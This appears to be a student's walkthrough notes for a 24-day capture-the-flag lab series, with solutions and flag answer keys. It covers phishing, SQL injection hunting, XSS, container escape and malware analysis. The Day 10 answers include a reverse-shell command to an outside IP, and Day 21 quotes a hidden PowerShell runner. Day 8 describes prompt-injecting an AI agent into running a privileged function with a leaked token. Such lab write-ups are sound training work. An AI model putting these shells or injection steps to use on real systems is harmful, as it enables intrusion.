Day-0
Advent of cyber prep trek

# 1. password pandemonium
## Solution:
- i typed in a random password that suits all the conditions and obtained the flag

## Flag:
```
THM{StrongStart}
```

# 2. suspicious chocolate 
## Solution:
- even though 99 results are safe i malicious resut also leads to an unsafe file
## Flag:
```
THM{NotSoSweet}
```

# 3. welcome to the attachbox 
## Solution:
- learnt using ls and cd
## Flag:
```
THM{Ready2Hack}
```

# 4. cmd conundrum
## Solution:
- used the /a command to reveal the hidden files
## Flag:
```
THM{WhereIsMcSkidy}
```

# 5. linux lore
## Solution:
- using linux commands like cat
## Flag:
```
THM{TrustNoBunny}
```

# 6. leak in the list
## Solution:
- i typed in the email id and clicked on the compromised domain to obtain the flag
## Flag:
```
THM{LeakedAndFound}
```

# 7. wifi woes in wareville
## Solution:
- i created a password for thw wifi router and obtained the flag
## Flag:
```
THM{NoMoreDefault}
```

# 8. the app trap
## Solution:
- opened the third party app and revoked all permissions
## Flag:
```
THM{AppTrapped}
```

# 9. chatbot confession
## Solution:
- selected all the chatbot outpust which contains sensitive info
## Flag:
```
THM{DontFeedTheBot}
```

# 10. bunny's browser trail
## Solution:
- selected the browser which isnt the commone one like google, mozialla etc.
## Flag:
```
THM{EastmasIsComing}
```


Day-1
Linux CLI - shell bells

# 1. linux cli
## Solution:
- obtained the first flag using cat and ls in guides directory
- used grep, find and ls -a o find the next flag
- logged in as a sudo user and obtained the third flag
## Flag:
```
- THM{learning-linux-cli}
- THM{sir-carrotbane-attacks}
- THM{until-we-meet-again}
```


Day-2
Phishing

# 1. phishing for tbfc
- we have to manipulate user to make a mistake and obtain the password.
## Solution:
- first we run the script so it listens to credentials.
- now we send an email to target user using SET which is designed for social engineering attacks which has many features. we configure the details of the email to be sent including a link so that target falls for the trick so yes when we open the terminal where the server is running the target user falls for the trape and 3 set of credentials are recieved
- for the next part we run the ip address and try to access using admin as factory and use the previosu password to obtain the answer.
## Flag:
```
pass: unranked-wisdom-anthem
ans: 1984000
```


Day-3
splunk basics

# 1. log analysis with spunk

## Solution:
```
Search query: index=main
```
- this query all time gives us all the ingested logs

```
Search query: index=main sourcetype=web_traffic | timechart span=1d count
```
- this query gives us traffic on web of total logs for each day and there was a spike for 6 specfific days out of which 12th ocotber 2025 (2)* was the highest
- then we go to the user agent field which tells us what software initiated the web request

```
Search query: index=main sourcetype=web_traffic user_agent!=*Mozilla* user_agent!=*Chrome* user_agent!=*Safari* user_agent!=*Firefox*
```
- searches fir traffic on non standard browser and all of them are from the same ip address (1)*

```
Search query: sourcetype=web_traffic client_ip="<REDACTED>" AND path="*..\/..\/*" OR path="*redirect*" | stats count by path
```
- this tells us what path the hacker used which checks for vulnerabilities so gain access of unauthurized files on the website

```
Search query: sourcetype=web_traffic client_ip="<REDACTED>" AND user_agent IN ("*sqlmap*", "*Havij*") | table _time, path, status
```
- the results confirms the use of known SQL injection and attacks like SLEEP(5). A 504 code confirms a successful time-based SQL injection attack. (3)* (4)*

```
Search query: sourcetype=firewall_logs src_ip="10.10.1.5" AND dest_ip="<REDACTED>" AND action="ALLOWED" | table _time, action, protocol, src_ip, dest_ip, dest_port, reason
```
- now we switch to firewall and use our comprimised ip and the output gives us allowed which confirms succesful connection

```
Search Query: sourcetype=firewall_logs src_ip="10.10.1.5" AND dest_ip="<REDACTED>" AND action="ALLOWED" | stats sum(bytes_transferred) by src_ip
```
- This gives the number of bytes transfered (5)*
## Flag:
```
- 198.51.100.55 (1)*
- 2025-10-12 (2)*
- 993 (3)*
- 658 (4)*
- 126167 (5)8
```
## Concepts learnt:
- Identity found: The attacker was identified via the highest volume of malicious web traffic originating from the external IP.
- Intrusion vector: The attack followed a clear progression in the web logs (sourcetype=web_traffic).
- Reconnaissance: Probes were initiated via cURL/Wget, looking for configuration files (/.env) and testing path traversal vulnerabilities.
- Exploitation: The use of SQLmap user agents and specific payloads (SLEEP(5)) confirmed the successful exploitation phase.
- Payload delivery: The Action on Objective was established by the final successful execution of the command cmd=./bunnylock.bin via the webshell.
- C2 confirmation: The pivot to the firewall logs (sourcetype=firewall_logs) proved the post-exploitation activity. The internal, compromised server (SRC_IP: 10.10.1.5) established an outbound C2 connection to the attacker's IP.


Day-4
Ai in security

# 1. Ai for cyber security showcase 
## Solution:
- this was more of to understand how ai will help us in cyber security
- ai is good in running large amounts of data, performing behaviour analytics, and can generate alerts as it is good at analysing behaviour and good at summarazing data.
- first we tell ai we are ready to begin and it gives us a vulnerabilty sql injection to bypass login and generates a script to compromise it so it gives a code and ask us to copy and paste it and run it from the terminal and we fill in the required ip address
- so the script works and we recieved the succesful web output which gives us the flag.
- Then we complete blue team to analyse llogs for the performed attack so it detects the log and then ai analysises source code which identifies the vulnerabilty and we get the final flag after we conclude our activity
## Flag:
```
- THM{AI_MANIA}
- THM{SQLI_EXPLOIT}
```


Day-5
IDOR

# 1. IDOR on the shelf (insecure direct object reference)
## Solution:
- Insecure direct object references (IDOR) are a type of access control vulnerability that arises when an application uses user-supplied input to access objects directly.
- so first i type in the given credentials and play around a little to find out that my user-id is 10 and from then on i perform the various objectives to figure our how the idor vulnerability can be exploited
- then i move on to learn about horizontal and vertical privilege escalation and further play around with the user id from the inspect tool to answer the final question


Day-6
Malware analysis

# 1. Malware analysis using sandboxes
## Solution:
- Malware analysis is the process of examining a malicious file to understand its functionality, operation, and methods for defence against it. 
- we use static analysis which can be quick and effective way to understand how sample may operate.
- first we open pestudio and load the excutable and look for the sha256 a unique identifier for the excutable
- then we move on with strings of the excutable where we found a flag
- no we do the dynamic analysis where we excute the malicious sample using regshot where it takes snapshot before and after running and compares them. Then we investigate the interaction with windows os there we find the last two information about the path of the key that has been modified and we figured the network protocol used for tcp operations
## Flag:
```
- F29C270068F865EF4A747E2683BFA07667BF64E768B38FBB9A2750A3D879CA33
- THM{STRINGS_FOUND}
- HKU\S-1-5-21-1966530601-3185510712-10604624-1008\Software\Microsoft\Windows\CurrentVersion\Run\
- http
```


Day-7
Network discovery

# 1. discover network services
## Solution:
- we are given the target machine name and ip and first we shall scan for ports so we type nmap and the ip address of target so we can open ither by ssh or http
- now we add the -p- argument to scann all ports and --script=banner to see whats behind the port. we log in with an anonymous name on the ftp server and get key 1
- now we move to port 25251 using netcat command and type HELP and use GET key command and obtain the second key
- now we switch to udp ports using nmap and ip and specifying -sU and now use the dig command which performs advance dns queries and obtain the 3rd key
- now we login to the secret admin terminal and list the listening ports and we can see the services we scanned
- 3306 port is for mysql database and upon running the command it shows one table with flag. Then we run an sql query which selects all of the data from the table and thats how we obtain the final flag

## Flag:
```
- Pwned by HopSec
- 3aster_
- 15_th3_
- n3w_xm45
- 3306
- THM{4ll_s3rvice5_d1sc0vered}
```


Day-8
Prompt injection

# 1. Agentic Ai hack
- Large language models are the basis of many current AI systems. They are trained on massive collections of text and code, which allows them to produce human-like answers, summaries, and even generate programs or stories.
- LLMs have restrictions that prevent them from going beyond their built-in abilities, which limits them. They cannot act outside their text box, and their training only lasts up to a certain point in time. Because of this, they may invent facts, miss recent events, or fail at tasks that require real-world actions.
## Solution:
-  the 25th in the calender has been set to easter instead of christmas so first we tell the ai to change that and it gives a base 64 endcoded json output and then we click on the thinking which shows the breach or instructions which explains the funcion reset holiday so then li ask it to list the all available functions that are being used so we need reset holiday function.
- we tell it to excute reset holiday and needs parameters. Now we run get logs function since we the need the token so a leaked token poped up and it might be the token. Now once we run it it tells us that in the backend the name is stored as sochmas so we change the name and type out the same prompt anf hence we get the edited webpage with 25th edited to christams
## Flag:
```
- THM{XMAS_IS_COMING__BACK}
```


Day-9
Passwords

# 1. Attack against encrypted files
- dictionary attack uses predefined set of list of potential passwords.
- mask attacks or brute-force attack systematically tries every possible combination of characters until it finds the right one
## Solution:
- first use file command and confirm the file format of the files on the desktop and accordingly pick tools
- now we use pdfcrack tool which uses the pdf and wordlist to obtain the password the pdf file
- for the zip file we use ```zip2john``` which extracts contents of the zip to another file which we name and then attach the wordlist so that we obtain the password of the zip file
## Flag:
```
- THM{Cr4ck1ng_PDFs_1s_34$y}
- THM{Cr4ck1n6_z1p$_1s_34$yyyy}
```


Day-10
Soc alert triaging

# 1. Investigation and logs
## Solution:
- we first set up our enivironment and when an alert pops up we investigate which consists of multiple levels so we navigate to microsoft sentinel and based on the questiosn and answers required we individually investigate
- first we investiagte superfically on top and obtain the first three answers and next we ive deeper in to logs and anylse queries and much more to obtain the rest of the answers
## Flag:
```
- 10
- High
- 4
- malicious_mod.ko
- /bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1
- 172.16.0.12
- 203.0.113.45
- deploy
```


Day-11
XSS

# 1. Leave the cookies 
- cross site scripting or xss is a vulnerabilty that lets attackers inject code into input fields that reflect content viewed by other users
## Solution:
- first we type in test in the search bar and the bar reflects the text itselft but now instaed of that we run a simple html code and to out surprise it runs the code and prints teh flag
- in the next place when we typed out the message the message gets stored in the database so we send a simple html code and once we reload the page we observe that the code ran and hence this is stored crossside scripting and this gave out a flag as well

## Flag:
```
- stored
- THM{Evil_Bunny}
- THM{Evil_Stroed_Egg}
```


Day-12
Phishing

# 1. Spotting Phishing Emails 
- Phishing is a cyberattack where people impersonate trusted entities via emails, texts, or calls to trick people into revealing sensitive data or downloading malware, often by directing them to fake websites that look real
## Solution:
- we look at the first email and observe all details properly so we select spoofing, sense of urgency and fak invoice and obtain the first flag 
- the second email had a malicious attachment was clearly spoofing and showed signs of impersonation and obtain the flag
- the thrid email was clearly impersonation and there great sense of urgency as well as social engineering text so thats for the third email
- for the 4th email it is clearly trying to impersonate HR and was an external sender domain and because of the salary appraisel it is a social engineering text
- The 5th email didnt have any links, attachments or false agenda hence it was just a simple spam email
- the sender email replaced t with a curly brace so its clearly impersonation and they do have puny code so we choose that and social engineeering cause it mentions laptop upgrades
## Flag:
```
- THM{yougotnumber1-keep-it-going}
- THM{nmumber2-was-not-tha-thard!}
- THM{Impersonation-is-areal-thing-keepit}
- THM{Get-back-SOC-mas!!}
- THM{It-was-just-a-sp4m!!}
- THM{number6-is-the-last-one!-DX!}
```


Day-13
YARA rules

# 1. YARA
- YARA is a tool built to identify and classify malware by searching for unique patterns, the digital fingerprints left behind by attackers
- A YARA rule is built from several key elements:
Metadata: information about the rule itself: who created it, when, and for what purpose.
Strings: the clues YARA searches for: text, byte sequences, or regular expressions that mark suspicious content.
Conditions: the logic that decides when the rule triggers, combining multiple strings or parameters into a single decisio
## Solution:
- first we copy the given rule in a text editor where it extrcts an tbfc messages sent by mcskidy
- so we create a yara rule which looks for strings starting with tbfc and from a-z and 0-9 and code inside a file. then we find 5 images containing string tbfc
- now we go the regular expression string and based on the hind obtain the search code which is the answer
- now we run the rule we ran previously which gave each image and a text so now we make a meaningufl message out of that text
## Flag:
```
- 5
- TBFC:[A-Za-z0-9]+
- find me in hopsec island
```


Day-14
Containers

# 1. Container Security
- Docker is an open-source platform for developers to build, deploy, and manage containers. Containers are executable units of software which package and manage the software and components to run a service. They are pretty lightweight because they isolate the application and use the host OS kernel.
- A container escape is a technique that enables code running inside a container to obtain rights or execute on the host kernel (or other containers) beyond its isolated environment (escaping). For example, creating a privileged container with access to the public internet from a test container with no internet access. 
## Solution:
- first we run docker ps and we see the services running and then copy thr main application ip address and navigate to the web and we see the hoperoo app.
- we found an uptime checker container and run and we check the socket accessfor docker.sock and so we have access to the file and when we run the next command we attained controlled of the secured container and we type out cd .. to move out to the previous directory followed by ls and we see a flag.txt file
- we run the recovery script using sudo command which reverses the server and door dashes website is restored
- For the bonus question we naviagte to port 5002 on the wareville times were three words marked in red bold which turned out to be the required password
## Flag:
```
- docker ps
- Dockerfile
- THM{DOCKER_ESCAPE_SUCCESS}
- DeployMaster2025!
```


Day-15
Web Attack Forensics

# 1. Web attack foreniscs 
- splunk is a platform for analysing and storing machine data and sysmon refers to system monitor that monitors log and various events happening within windows
## Solution:
- first we type out the ip and port and login to out splunk account.
- first we search for hhtp requests that might be malicious like cmd.exe or powershellwhich help identify command injection attacks and we are intreste din the base 64 encodings and paste the powershell commands in a base64 decoder
- then we look for server side errors whiehc inspects apache error logs
```
- index=windows_apache_access (cmd.exe OR powershell OR "powershell.exe" OR "Invoke-Expression") | table _time host clientip uri_path uri_query status
- index=windows_apache_error ("cmd.exe" OR "powershell" OR "Internal Server Error")
- index=windows_sysmon ParentImage="*httpd.exe"
- index=windows_sysmon *cmd.exe* *whoami*
```
- now we trace process creation from apache where the query focuses on process relationships for sysmon logs and ideally apache should spwan worker threads and not system processes
- in the 4th query it finds what specific programs found before can do.
- we go the original filename in the pslun dashboard and obtain the first answer
## Flag:
```
- whoami.exe
- powershell.exe
```


Day-16
Forensics

# 1. Investigating gifts of delivery malfunction
- Windows OS is not a human, but it also needs a brain to store all its configurations. This brain is known as the Windows Registry. The registry contains all the information that the Windows OS needs for its functioning. 
- Registry forensics is the process of extracting and analyzing evidence from the registry. In Windows digital forensic investigations, investigators analyze registry, event logs, file system data, memory data, and other relevant data to construct the whole incident timeline. 
## Solution:
- first we open the registry and load the files into the registry and since sometimes these registry filesmight be dirty we use the skift key and then open to load associated transaction log files which ensures clean hive state.
- first we go the directory which gives us info about install programs and there we naviaget to the 2025 packages and see a package installed from droneManager Updater which is suspicious
- next for the path we go to \userassist which stores info about accesed applications launched via gui and we navigate to dronemanagersetup.exe and obtain the path
- for the next answer we are required to naviagete to \run which consists of info of pragrams that automatically start and there we find out thirs answer
## Flag:
```
- DroneManager Updater
- C:\Users\dispatch.admin\Downloads\DroneManager_Setup.exe
- "C:\Program Files\DroneManager\dronehelper.exe" --background
```


Day-17
Cyberchef

# 1. Locks
- crack the gates and obtain the password
## Solution:
- first guard is cottontail and we naviaget to web developer tools and see the response headerss where we see aplications javascript file and use the help of base 64 decode and encoder and obtain the first password and important thing is we got to debugger and find the econding / decoidng form exactly to obtain the password so we shall keep that in mind
- second guard is carrothelm so we followe the same process till debugger and do the same things after as well
- third gate has a bit of xor enconding in it when we go to the debugger so we get the password and now we xor it using the key mentioned as cyberchef and then convert from base 64 to get the third password
- so the 4th password is an md5 hash so we go to an md5 hash cracker so we decode the password from there
- for 5th level we have different levels as well and since it is mentioned r2 it clearly says from base 64 from hex and reverse
## Flag:
```
- iamsofluffy
- Itoldyoutochangeit!
- BugsBunny
- passw0rd1
- 51rBr34chBl0ck3r
- THM{M3D13V4L_D3C0D3R_4D3P7}
```


Day-18
Obfuscation

# 1. Obfuscation & Deobfuscation
- bfuscation is the practice of making data hard to read and analyze. Attackers use it to evade basic detection and delay investigations
## Solution:
- we open a document on the desktop and first part was instructions of deobsfucation which is base64 encoded so we obtain the url by decoding it and then what we do it we excute the file to obtain the flag for deobsfucation
- we go down to the task 2 for obfuscation and paste the output in the given space and obtain the flag for this task
## Flag:
```
- THM{C2_De0bfuscation_29838}
- THM{API_Obfusc4tion_ftw_0283}
```


Day-19
ICS/Modbus

# 1. SCADA (Supervisory Control and Data Acquisition) & PLC/Modbus protocol
- SCADA systems are the "command centres" of industrial operations. They act as the bridge between human operators and the machines doing the work
- A PLC (Programmable Logic Controller) is an industrial computer designed to control machinery and processes in real-world environments
- Modbus is the communication protocol that industrial devices use to talk to each other, Modbus succeeded because it's simple, reliable, and works with almost any device.
## Solution:
- the answer for the first task is given in the explanation where the port is commonly used for Modbus tcp connections
- for the second task we followe the runthrough and the basic motto is to restore the drone control system and once when we restore the system we obtain the flag
## Flag:
```
- 502
- THM{eGgMas0V3r}
```


Day-20
Race conditions

# 1. Race condition
- A race condition happens when two or more actions occur at the same time, and the system’s outcome depends on thebunny character showing car racing. order in which they finish. In web applications, this often happens when multiple users or automated requests simultaneously access or modify shared resources, such as inventory or account balances.
- we use burp suite which acts as a middle man between website and broswer
## Solution:
- first we switch off the intercept tab and then we checkout on the website and go to process checout page on burp suite.
- we go to the repeaters tab and then we configure it by adding it into a cart group and duplicating it 10 times and sending the request and now when we go to the page and reload it we the oversold output of -2 and thats how we obtain the first flag
- now we do the same thing by overselling the blue bunny plush and obtain the second flag
## Flag:
```
- THM{WINNER_OF_R@CE007}
- THM{WINNER_OF_Bunny_R@ce}
```


Day-21
Malware analysis

# 1. Malware analysis
- HTA file, short for HTML Application. An HTA file is like a small desktop app built using familiar web technologies such as HTML, CSS, and JavaScript. Unlike regular web pages that open inside a browser, HTA files run directly on Windows through a built-in component called Microsoft HTML Application Host - mshta.exe process. This allows them to look and behave like lightweight programs with their own interfaces and actions
## Solution:
- the answer for the first question is the title of the html file
- the getQuestions spins the internet explorer application and havigates to the url that points to the txt file controled by the attacker and whoever texts on that page is deifned as the variale result to that function is the answer for the next question
- the third answer is the url from the getQuestions function
- malhare used two iis in the url to trick the user so that remains the answer for the next question
- there were clearly 4 questions in the html file so that is the 5th answer
- similarly by analysing the file we get the answers and flags to all the 13 questions
## Flag:
```
- Best Festival Company Developer Survey
- getQuestions
- survey.bestfestiivalcompany.com
- i
- 4
- South Pole
- ComputerName,UserName
- /details
- GET
- runObject.Run "powershell.exe -nop -w hidden -c " & feedbackString, 0, False
- base64
- rot13
- THM{Malware.Analysed}
```


Day-22
C2 detection

# 1. Detecting C2 with RITA
- Real Intelligence Threat Analytics (RITA) is an open-source framework created by Active Countermeasures. Its core functionality is to detect command and control (C2) communication by analyzing network traffic captures and logs
- The magic behind RITA is its analytics. It correlates several captured fields, including IP addresses, ports, timestamps, and connection durations, among others
- RITA only accepts network traffic input as Zeek logs. Zeek is an open-source network security monitoring (NSM) tool. Zeek is not a firewall or IPS/IDS; it does not use signatures or specific rules to take an action. It simply observes network traffic via configured SPAN ports, physical network taps, or imported packet captures in the PCAP format
## Solution:
- first we shal convert our pcap netwrok capture to zeek logs and naviagte to the specific directory created by the command and find all the zeek logs
```
zeek readpcap <pcapfile> <outputdirectory>
```
- no to analyse using RITA we use `rita view <database-name>`
- now we use the sam analysis to anylase the given pcap file

## Flag:
```
- 6
- Prevalence
- 40
- dst:rabbithole.malhare.net beacon:>-70 sort:duration-desc
- 80
```


Day-23
AWS security

# 1. using aws security
- exploring the aws security portal and running specific commands to obtain the flags
## Solution:
- for the first flag we simply run the given command to obtain the answer
- the second answer is a simple questions wher the IAM permissions are described in the policy
- we run the command that has been given and in the ouput the policy name has been given so that remains the answer for the next question

## Flag:
```
- 123456789012
- policy
- SirCarrotbanePolicy
- ListAllMyBuckets
- THM{more_like_sir_cloudbane}
```


Day-24
Exploitations with cUrl

# 1. Web hacking using cUrl
- curl is a command-line tool for crafting HTTP requests and viewing raw responses. It's ideal when you need precision or when GUI tools aren't available.
- -X POST tells cURL to use the POST method.
- d defines the data we're sending in the body of the request.
## Solution:
- Once you log in, web applications use cookies to keep your session active. When you make another request with your browser, the cookie gets sent automatically, but with cURL, you need to handle it by ourself like the -c option writes any cookies received from the server into a file and then we can send POST requests and manage sessions
- command for the first flag
```
curl -i -X POST -d "username=admin&password=admin" http://10.67.173.159/post.php
```
- command for the second flag
```
curl -c cookies.txt -d "username=admin&password=admin" http://10.67.173.159/cookie.php
```
- for the third flag we create a passwords.txt file and paste the given passwords and create a loop trying each password and running thr bruteforce to obtain the correct password
- some applications block cURL by checking the User-Agent header
```
curl -i -A "internalcomputer" http://MACHINE_IP/ua_check.php
```
## Flag:
```
- THM{curl_post_success}
- THM{session_cookie_master}
- secretpass
- THM{user_agent_filter_bypassed}
```

